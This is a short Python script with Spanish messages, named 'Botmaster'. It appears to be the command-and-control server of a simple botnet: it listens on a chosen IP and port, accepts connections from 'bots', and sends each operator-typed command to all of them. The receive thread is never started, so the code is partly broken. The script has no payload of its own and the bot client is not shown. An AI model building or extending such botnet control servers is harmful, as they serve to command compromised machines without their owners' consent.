#-*-coding: utf-8-*-
from socket import *
import threading
from sys import argv

class Botmaster:
	def __init__(self):
		self.conns = []
		msgerr = "sintaxis:\n{} (ip) (puerto) (numero de bots)".format(argv[0])
		if len(argv) != 4:
			print(msgerr)
			exit()
		else:
			try:
				argv[2] = int(argv[2])
				argv[3] = int(argv[3])
			except Exception as e:
				print("{}\n{}".format(msgerr, e))
				exit()
			else:
				try:
					self.sock = socket(AF_INET, SOCK_STREAM)
					self.sock.bind((argv[1], argv[2]))
					self.sock.listen(argv[3])
					self.sock.settimeout(5)
					w4conn = threading.Thread(target=self.w4c)
					w4conn.daemon = True
					w4conn.start()
				except Exception as e:
					print("Ha habido problemas al iniciar el servidor.\n{}\n{}".format(msgerr,e))
					exit()
				else:
					printrecv = threading.Thread(target=self.pr)
					msg = str()
					while msg != "exit":
						msg = input(">>")
						for c in self.conns:
							c.send(msg.encode())


	def w4c(self):
		while True:
			try:
				conn, addr = self.sock.accept()
				print("Se ha establecido una nueva conexión: {}.".format(addr))
				self.conns.append(conn)
			except:
				pass
		
	def pr(self):
		while True:
			for c in self.conns:
				try:
					print("\n{}>{}\n>>".format(c, c.recv(1024).decode()))
				except:
					pass

if __name__ == '__main__':
	main = Botmaster()
	